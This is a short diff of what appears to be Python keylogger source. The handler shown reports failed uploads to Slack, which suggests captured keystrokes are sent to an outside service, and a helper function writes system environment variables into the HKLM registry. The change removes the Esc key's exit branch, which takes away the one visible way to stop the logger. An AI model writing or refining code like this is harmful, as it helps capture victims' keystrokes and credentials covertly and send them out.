@@ -15,9 +15,6 @@ def on_press(key):
             print("Failed to upload to slack, maybe the token or channel are not correct?")
             print("Error traceback: ", e)
 
-    elif key == keyboard.Key.esc:
-        sys.exit()
-
 def setenv_var(varname, value):
     try:
         rkey = win32api.RegOpenKeyEx(win32con.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment',0 ,win32con.KEY_WRITE)
